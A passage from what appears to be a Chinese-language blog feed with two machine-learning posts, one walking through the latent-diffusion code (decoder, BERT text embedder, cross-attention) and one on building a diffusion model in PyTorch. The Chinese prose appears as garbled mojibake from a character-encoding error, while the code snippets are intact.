embedding</span></span><br><span class="line">        temb = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># z to block_in</span></span><br><span class="line">        h = self.conv_in(z)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># middle</span></span><br><span class="line">        h = self.mid.block_1(h, temb)</span><br><span class="line">        h = self.mid.attn_1(h)</span><br><span class="line">        h = self.mid.block_2(h, temb)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># upsampling</span></span><br><span class="line">        <span class="keyword">for</span> i_level <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(self.num_resolutions)):</span><br><span class="line">            <span class="keyword">for</span> i_block <span class="keyword">in</span> <span class="built_in">range</span>(self.num_res_blocks+<span class="number">1</span>):</span><br><span class="line">                h = self.up[i_level].block[i_block](h, temb)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(self.up[i_level].attn) &gt; <span class="number">0</span>:</span><br><span class="line">                    h = self.up[i_level].attn[i_block](h)</span><br><span class="line">            <span class="keyword">if</span> i_level != <span class="number">0</span>:</span><br><span class="line">                h = self.up[i_level].upsample(h)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># end</span></span><br><span class="line">        <span class="keyword">if</span> self.give_pre_end:</span><br><span class="line">            <span class="keyword">return</span> h</span><br><span class="line"></span><br><span class="line">        h = self.norm_out(h)</span><br><span class="line">        h = nonlinearity(h)</span><br><span class="line">        h = self.conv_out(h)</span><br><span class="line">        <span class="keyword">if</span> self.tanh_out:</span><br><span class="line">            h = torch.tanh(h)</span><br><span class="line">        <span class="keyword">return</span> h</span><br></pre></td></tr></table></figure><h3 id="text-processing">text processing</h3><p>è¿™éƒ¨åˆ†ä¸»è¦æ˜¯ldm.modules.encoders.modules.BERTEmbedder,è¿™é‡Œé»˜è®¤ä½¿ç”¨huggingfaceçš„BertTokenizerFast.from_pretrained('bert-base-uncased').</p><p>ç„¶åTransformWrapperå°±æ˜¯NLPçš„token_emb,position_emb,attentionä¸‰ä»¶å¥—. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">BERTEmbedder</span>(<span class="title class_ inherited__">AbstractEncoder</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Uses the BERT tokenizr model and add some transformer encoder layers&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, n_embed, n_layer, vocab_size=<span class="number">30522</span>, max_seq_len=<span class="number">77</span>,</span></span><br><span class="line"><span class="params">                 device=<span class="string">&quot;cuda&quot;</span>,use_tokenizer=<span class="literal">True</span>, embedding_dropout=<span class="number">0.0</span></span>):</span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.use_tknz_fn = use_tokenizer</span><br><span class="line">        <span class="keyword">if</span> self.use_tknz_fn:</span><br><span class="line">            self.tknz_fn = BERTTokenizer(vq_interface=<span class="literal">False</span>, max_length=max_seq_len)</span><br><span class="line">        self.device = device</span><br><span class="line">        self.transformer = TransformerWrapper(num_tokens=vocab_size, max_seq_len=max_seq_len,</span><br><span class="line">                                              attn_layers=Encoder(dim=n_embed, depth=n_layer),</span><br><span class="line">                                              emb_dropout=embedding_dropout)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, text</span>):</span><br><span class="line">        <span class="keyword">if</span> self.use_tknz_fn:</span><br><span class="line">            tokens = self.tknz_fn(text)<span class="comment">#.to(self.device)</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tokens = text</span><br><span class="line">        z = self.transformer(tokens, return_embeddings=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> z</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">self, text</span>):</span><br><span class="line">        <span class="comment"># output of length 77</span></span><br><span class="line">        <span class="keyword">return</span> self(text)</span><br></pre></td></tr></table></figure></p><h3 id="attention">attention</h3><p>ä¸å¾—ä¸è¯´è¿™ä¸ªä»£ç æ˜¯çœŸçš„æŠ½è±¡,è¿™ä¸ªconditionçœŸçš„ä¼ äº†ä¸€ä¸‡ä¸ªå‡½æ•°ä¸€ä¸‡ä¸ªç±», ä¸è¿‡æœ¬è´¨è¿˜æ˜¯åœ¨Uneté‡Œé¢. <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://github.com/CompVis/latent-diffusion/blob/main/ldm/modules/attention.py#L152</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x, context=<span class="literal">None</span>, mask=<span class="literal">None</span></span>):</span><br><span class="line">        h = self.heads</span><br><span class="line"></span><br><span class="line">        q = self.to_q(x)</span><br><span class="line">        context = default(context, x)</span><br><span class="line">        k = self.to_k(context)</span><br><span class="line">        v = self.to_v(context)</span><br><span class="line"></span><br><span class="line">        q, k, v = <span class="built_in">map</span>(<span class="keyword">lambda</span> t: rearrange(t, <span class="string">&#x27;b n (h d) -&gt; (b h) n d&#x27;</span>, h=h), (q, k, v))</span><br><span class="line"></span><br><span class="line">        sim = einsum(<span class="string">&#x27;b i d, b j d -&gt; b i j&#x27;</span>, q, k) * self.scale</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> exists(mask):</span><br><span class="line">            mask = rearrange(mask, <span class="string">&#x27;b ... -&gt; b (...)&#x27;</span>)</span><br><span class="line">            max_neg_value = -torch.finfo(sim.dtype).<span class="built_in">max</span></span><br><span class="line">            mask = repeat(mask, <span class="string">&#x27;b j -&gt; (b h) () j&#x27;</span>, h=h)</span><br><span class="line">            sim.masked_fill_(~mask, max_neg_value)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># attention, what we cannot get enough of</span></span><br><span class="line">        attn = sim.softmax(dim=-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        out = einsum(<span class="string">&#x27;b i j, b j d -&gt; b i d&#x27;</span>, attn, v)</span><br><span class="line">        out = rearrange(out, <span class="string">&#x27;(b h) n d -&gt; b n (h d)&#x27;</span>, h=h)</span><br><span class="line">        <span class="keyword">return</span> self.to_out(out)</span><br></pre></td></tr></table></figure></p><p>é‚£å…¶å®ä»ç»“æœæ¥çœ‹å°±æ˜¯xå’Œconditionè¿›è¡Œcross attentionç„¶åè¾“å‡ºä¸¢è¿›Unet,ç„¶åencodeå’Œdecodeé‚£ä¸€å¥—. ä»ä»£ç æ‰§è¡Œé€»è¾‘æ¥çœ‹å’Œä¹‹å‰åˆ†æçš„ç¡®å®ä¹Ÿå·®ä¸å¤š,ä»Šå¤©çš„åˆ†ææš‚æ—¶å…ˆåˆ°è¿™,ä¸‹æ¬¡ç»§ç»­çœ‹,ç„¶åè¯•è¯•èƒ½ä¸èƒ½è‡ªå·±æ¥å†™ä¸€ä¸ªç®€æ˜“LDM.</p><h2 id="implementation4.14-4.15">implementation(4.14-4.15)</h2><p>çœ‹äº†ä¸‹datasetå’Œå…·ä½“å®ç°éƒ¨åˆ†,å®˜æ–¹çš„ä»£ç æ„Ÿè§‰æœ‰ç‚¹éš¾è¯»,ç„¶åæ³¨æ„åˆ°encoderçš„éƒ¨åˆ†ä¼¼ä¹å®ç°å’Œä¹‹å‰æƒ³çš„æœ‰ç‚¹å·®å¼‚,ç¬¬ä¸€é˜¶æ®µçš„encoderå’Œdecoderå…¶å®åªæ˜¯first_stageçš„å…¶ä¸­ä¸€éƒ¨åˆ†,æœ€ç»ˆä½¿ç”¨ä¼¼ä¹è¿˜æ˜¯<a href="https://github.com/CompVis/latent-diffusion/blob/main/ldm/models/autoencoder.py">ldm.models.autoencoder.VQModelInterface</a>. ç„¶åæ¨¡å‹çš„è®­ç»ƒä¼¼ä¹ä¹Ÿå’Œä¹‹å‰æƒ³çš„ä¸å¤ªä¸€æ ·,çœ‹å®˜æ–¹çš„æ„æ€ä¼¼ä¹æ˜¯å¾—å…ˆ<strong>è®­ç»ƒå¥½</strong>autoencoder,ä¹‹åå†ç›´æ¥å¯¹autoencoderè¿›è¡Œä½¿ç”¨:encoderè¿›latent spaceç„¶åè®¡ç®—,é¢„æµ‹ä¹‹ådecodeåšè¿”å›. ä¸è¿‡è¿™é‡Œå¹¶ä¸å¤ªäº†è§£encoderè®­ç»ƒç›¸å…³,æœ€è¿‘è¿˜å¾—å¤šçœ‹ä¸€ä¸‹,èƒ½æ‰¾åˆ°çš„èµ„æ–™ä¹Ÿéå¸¸å°‘,å®˜æ–¹çš„githubä»£ç å¯è¯»æ€§ä¹Ÿä¸æ˜¯å¾ˆè¡Œ.</p><p>ç„¶ådatasetå¼„çš„MSCOCO,ç»ƒæ‰‹å°é¡¹ç›®,éšç¼˜ä½¿ç”¨ä¸€ä¸ª600kå°±è¡Œäº†,ä¸è¿‡ç›®å‰åªæ˜¯å¤§æ¦‚ç¡®è®¤äº†ä¸€ä¸‹æ•°æ®,æœ€åå¤§æ¦‚è¿˜éœ€è¦å†™ä¸ªdatasetå’Œdataloaderä¹‹ç±»çš„è½½å…¥ç±».</p><blockquote><p>https://arxiv.org/abs/2012.09841 https://arxiv.org/abs/2112.10752 https://www.spaces.ac.cn/archives/6760#VQ-VAE https://zhuanlan.zhihu.com/p/582693939 https://www.cnblogs.com/zackstang/p/17324257.html#_label5</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ML </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>diffusion model(1)</title>
      <link href="/2024/04/10/diffusion-model-1/"/>
      <url>/2024/04/10/diffusion-model-1/</url>
      
        <content type="html"><![CDATA[<p>ç”Ÿæˆæ¨¡å‹å‰æ®µæ—¶é—´ä¸€ç›´æ˜¯å¾ˆç«çš„è¯é¢˜,ä¹‹å‰çš„gpt,ç„¶åaiç”»å›¾ä»¥åŠä¸ä¹…å‰çš„aiç”Ÿæˆè§†é¢‘éƒ½è¯æ˜ç”Ÿæˆæ¨¡å‹æ˜¯å¾ˆæœ‰æ½œåŠ›çš„ç ”ç©¶æ–¹å‘. ä»Šå¤©kaggleçœ‹çš„topicæ˜¯ä¸€ä¸ªGAN,ç›´æ¥è®©æˆ‘æƒ³èµ·äº†ä¹‹å‰çœ‹çš„diffusion modelä¸€ç›´æ²¡æ¥å¾—åŠå†™. æ‰€ä»¥è¿™é‡Œå…ˆæŠŠdiffusion modelå†™å®Œç„¶åç­‰æ˜å¤©æˆ–åå¤©å†™ä¸€ä¸‹GANç›¸å…³. è¿™é‡Œæˆ‘å‚è€ƒçš„æ•™ç¨‹ä¸»è¦æ˜¯youtubeä¸Šé¢çš„<a href="https://www.youtube.com/watch?v=a4Yfz2FxXiY">diffusion model from scratch in PyTorch</a>, è€Œä»–çš„notebookä¹Ÿä»¥åŠåœ¨<a href="https://colab.research.google.com/drive/1sjy9odlSSy0RBVgMTgP7s99NXsqglsUL?usp=sharing#scrollTo=wLHSIArLcFK0">GoogleColab</a>ä¸Šäº†.</p><h2 id="å·¥ä½œåŸç†">å·¥ä½œåŸç†</h2><p>æ­£å‘è¿‡ç¨‹: å‘æŸç±»å›¾ç‰‡æŒç»­æ·»åŠ å™ªéŸ³ç›´åˆ°æ•´ä¸ªå›¾ç‰‡å®Œå…¨å˜æˆå™ªéŸ³. é€†å‘è¿‡ç¨‹: é€šè¿‡ä»çº¯å™ªéŸ³é€†å‘é€æ­¥å»é™¤å™ªéŸ³è¾¾åˆ°ç”Ÿæˆç‰¹å®šå›¾ç‰‡çš„ç›®çš„.</p><p>æ•´ä¸ªè¿‡ç¨‹ä¸­ä¸‹ä¸€ä¸ªå›¾ç‰‡ä»…ä¸ä¸Šä¸€ä¸ªå›¾ç‰‡ç›¸å…³(markov chain).</p><p>å…¶ä¸­æ²¡æœ‰ä»»ä½•å™ªéŸ³çš„å›¾ç‰‡æˆ‘ä»¬è®°ä¸º<code>$ x_0 $</code>, çº¯å™ªéŸ³æˆ‘ä»¬è®°ä¸º<code>$ x_t $</code>. æ•´ä¸ªæ­£å‘è¿‡ç¨‹è¡¨ç°ä¸º:</p><p><span class="math display">\[ q(x_t|x_{t-1}) = N(x_t;\sqrt{1-\beta_t}x_{t-1}, \beta_tI) \]</span></p><p>å…¶ä¸­<code>$ x_t $</code>æ˜¯è¾“å‡º, å…¬å¼è¡¨ç¤ºå‡å€¼ä¸º$ x_{t-1} $ , æ–¹å·®ä¸º $ \beta_tI $ çš„é«˜æ–¯åˆ†å¸ƒ.</p><p>ç„¶åä¾æ®æ•°å­¦æ¨å¯¼,æˆ‘ä»¬å¯ä»¥ç›´æ¥å¾—åˆ°ä» $ x_0 $ åˆ° $ x_t $ çš„æ¨å¯¼: $ q(x_t|x_0) = N(x_t;\sqrt{\overline\alpha_{t}}x_0, (1-\overline\alpha_t)I) $</p><p>å…¶ä¸­ $ \alpha_t = 1 - \beta_t $, $ \overline\alpha_t = \prod_{s=1}^t \alpha_s $</p><p>è¿™ä¸ªè¿‡ç¨‹å¯ä»¥æ¢å…ƒåŠ é«˜æ–¯åˆ†å¸ƒç›¸åŠ è¯æ˜.</p><h2 id="ä»£ç éƒ¨åˆ†">ä»£ç éƒ¨åˆ†</h2><h3 id="æ•°æ®é›†ç›¸å…³">æ•°æ®é›†ç›¸å…³</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_images</span>(<span class="params">datset, num_samples=<span class="number">20</span>, cols=<span class="number">4</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Plots some samples from the dataset &quot;&quot;&quot;</span></span><br><span class="line">    plt.figure(figsize=(<span class="number">15</span>,<span class="number">15</span>)) </span><br><span class="line">    <span class="keyword">for</span> i, img <span class="keyword">in</span> <span class="built_in">enumerate</span>(data):</span><br><span class="line">        <span class="keyword">if</span> i == num_samples:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        plt.subplot(<span class="built_in">int</span>(num_samples/cols) + <span class="number">1</span>, cols, i + <span class="number">1</span>)</span><br><span class="line">        plt.imshow(img[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">data = torchvision.datasets.StanfordCars(root=<span class="string">&quot;.&quot;</span>, download=<span class="literal">True</span>)</span><br><span class="line">show_images(data)</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ–¯å¦ç¦å¤§å­¦çš„æ±½è½¦æ•°æ®é›†. å±•ç¤ºä¸€ä¸‹è®­ç»ƒçš„å›¾ç‰‡å¤§æ¦‚é•¿ä»€ä¹ˆæ ·å­. <img src="stanford_cars.png" /></p><h3 id="betaå’Œalphaè®¡ç®—">betaå’Œalphaè®¡ç®—</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">linear_beta_schedule</span>(<span class="params">timesteps, start=<span class="number">0.0001</span>, end=<span class="number">0.02</span></span>):</span><br><span class="line">    <span class="keyword">return</span> torch.linspace(start, end, timesteps)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_index_from_list</span>(<span class="params">vals, t, x_shape</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">    Returns a specific index t of a passed list of values vals</span></span><br><span class="line"><span class="string">    while considering the batch dimension.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    batch_size = t.shape[<span class="number">0</span>]</span><br><span class="line">    out = vals.gather(-<span class="number">1</span>, t.cpu())</span><br><span class="line">    <span class="keyword">return</span> out.reshape(batch_size, *((<span class="number">1</span>,) * (<span class="built_in">len</span>(x_shape) - <span class="number">1</span>))).to(t.device)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forward_diffusion_sample</span>(<span class="params">x_0, t, device=<span class="string">&quot;cpu&quot;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">    Takes an image and a timestep as input and </span></span><br><span class="line"><span class="string">    returns the noisy version of it</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    noise = torch.randn_like(x_0)</span><br><span class="line">    sqrt_alphas_cumprod_t = get_index_from_list(sqrt_alphas_cumprod, t, x_0.shape)</span><br><span class="line">    sqrt_one_minus_alphas_cumprod_t = get_index_from_list(</span><br><span class="line">        sqrt_one_minus_alphas_cumprod, t, x_0.shape</span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># mean + variance</span></span><br><span class="line">    <span class="keyword">return</span> sqrt_alphas_cumprod_t.to(device) * x_0.to(device) \</span><br><span class="line">    + sqrt_one_minus_alphas_cumprod_t.to(device) * noise.to(device), noise.to(device)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define beta schedule</span></span><br><span class="line">T = <span class="number">300</span></span><br><span class="line">betas = linear_beta_schedule(timesteps=T)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Pre-calculate different terms for closed form</span></span><br><span class="line">alphas = <span class="number">1.</span> - betas</span><br><span class="line">alphas_cumprod = torch.cumprod(alphas, axis=<span class="number">0</span>)</span><br><span class="line">alphas_cumprod_prev = F.pad(alphas_cumprod[:-<span class="number">1</span>], (<span class="number">1</span>, <span class="number">0</span>), value=<span class="number">1.0</span>)</span><br><span class="line">sqrt_recip_alphas = torch.sqrt(<span class="number">1.0</span> / alphas)</span><br><span class="line">sqrt_alphas_cumprod = torch.sqrt(alphas_cumprod)</span><br><span class="line">sqrt_one_minus_alphas_cumprod = torch.sqrt(<span class="number">1.</span> - alphas_cumprod)</span><br><span class="line">posterior_variance = betas * (<span class="number">1.</span> - alphas_cumprod_prev) / (<span class="number">1.</span> - alphas_cumprod)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªéƒ¨åˆ†ä¸»è¦æ˜¯é€šè¿‡linspaceç”Ÿæˆå‡åŒ€åˆ’åˆ†ä¸ºTçš„ä¸€ä¸ªèŒƒå›´, ç„¶åä¾æ®è¿™äº›ç”Ÿæˆ $ alpha $ , $ alpha $ çš„ç´¯ä¹˜. å…³é”®éƒ¨åˆ†ä¸ºforward_diffusion_sampleè¿™ä¸ªå‡½æ•°,è¿™ä¸ªå‡½æ•°ç”Ÿæˆçš„æ•°æ®å³ä¸ºæˆ‘ä»¬ä¸Šé¢å…¬å¼å†™åˆ°çš„æ•°æ®, è¿™ä¸ªå‡½æ•°çš„ä½œç”¨ä¹Ÿå°±æ˜¯è·å–å›¾ç‰‡ $ x_0 $ åœ¨ç¬¬tæ­¥çš„æ—¶å€™åŠ ä¸Šäº†å™ªéŸ³çš„æ ·å­.</p><h3 id="è½½å…¥æ•°æ®æŸ¥çœ‹noisingæ•ˆæœ">è½½å…¥æ•°æ®æŸ¥çœ‹noisingæ•ˆæœ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> transforms </span><br><span class="line"><span class="keyword">from</span> torch.utils.data <span class="keyword">import</span> DataLoader</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">IMG_SIZE = <span class="number">64</span></span><br><span class="line">BATCH_SIZE = <span class="number">128</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_transformed_dataset</span>():</span><br><span class="line">    data_transforms = [</span><br><span class="line">        transforms.Resize((IMG_SIZE, IMG_SIZE)),</span><br><span class="line">        transforms.RandomHorizontalFlip(),</span><br><span class="line">        transforms.ToTensor(), <span class="comment"># Scales data into [0,1] </span></span><br><span class="line">        transforms.Lambda(<span class="keyword">lambda</span> t: (t * <span class="number">2</span>) - <span class="number">1</span>) <span class="comment"># Scale between [-1, 1] </span></span><br><span class="line">    ]</span><br><span class="line">    data_transform = transforms.Compose(data_transforms)</span><br><span class="line"></span><br><span class="line">    train = torchvision.datasets.StanfordCars(root=<span class="string">&quot;.&quot;</span>, download=<span class="literal">True</span>, </span><br><span class="line">                                         transform=data_transform)</span><br><span class="line"></span><br><span class="line">    test = torchvision.datasets.StanfordCars(root=<span class="string">&quot;.&quot;</span>, download=<span class="literal">True</span>, </span><br><span class="line">                                         transform=data_transform, split=<span class="string">&#x27;test&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> torch.utils.data.ConcatDataset([train, test])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_tensor_image</span>(<span class="params">image</span>):</span><br><span class="line">    reverse_transforms = transforms.Compose([</span><br><span class="line">        transforms.Lambda(<span class="keyword">lambda</span> t: (t + <span class="number">1</span>) / <span class="number">2</span>),</span><br><span class="line">        transforms.Lambda(<span class="keyword">lambda</span> t: t.permute(<span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>)), <span class="comment"># CHW to HWC</span></span><br><span class="line">        transforms.Lambda(<span class="keyword">lambda</span> t: t * <span class="number">255.</span>),</span><br><span class="line">        transforms.Lambda(<span class="keyword">lambda</span> t: t.numpy().astype(np.uint8)),</span><br><span class="line">        transforms.ToPILImage(),</span><br><span class="line">    ])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Take first image of batch</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(image.shape) == <span class="number">4</span>:</span><br><span class="line">        image = image[<span class="number">0</span>, :, :, :] </span><br><span class="line">    plt.imshow(reverse_transforms(image))</span><br><span class="line"></span><br><span class="line">data = load_transformed_dataset()</span><br><span class="line">dataloader = DataLoader(data, batch_size=BATCH_SIZE, shuffle=<span class="literal">True</span>, drop_last=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Simulate forward diffusion</span></span><br><span class="line">image = <span class="built_in">next</span>(<span class="built_in">iter</span>(dataloader))[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">plt.figure(figsize=(<span class="number">15</span>,<span class="number">15</span>))</span><br><span class="line">plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">num_images = <span class="number">10</span></span><br><span class="line">stepsize = <span class="built_in">int</span>(T/num_images)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, T, stepsize):</span><br><span class="line">    t = torch.Tensor([idx]).<span class="built_in">type</span>(torch.int64)</span><br><span class="line">    plt.subplot(<span class="number">1</span>, num_images+<span class="number">1</span>, <span class="built_in">int</span>(idx/stepsize) + <span class="number">1</span>)</span><br><span class="line">    img, noise = forward_diffusion_sample(image, t)</span><br><span class="line">    show_tensor_image(img)</span><br></pre></td></tr></table></figure><p>ç„¶åè¿™é‡Œå®šä¹‰è¯»å–å›¾ç‰‡æ—¶åº”è¯¥è¿›è¡Œçš„transformä»¥åŠè¾“å‡ºå›¾ç‰‡çš„æ—¶å€™çš„reversetransformå‡½æ•°,ç„¶åè°ƒç”¨forward_diffusion_sampleæ¥æŸ¥çœ‹noisingçš„æ•ˆæœ.</p><p><img src="noising_process.png" /></p><h3 id="unet">Unet</h3><p>ok,åˆ°è¿™é‡Œå‡†å¤‡å·¥ä½œå°±å·®ä¸å¤šäº†. æ¥ä¸‹æ¥çœ‹ä¸‹unetçš„ç»“æ„ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Block</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, in_ch, 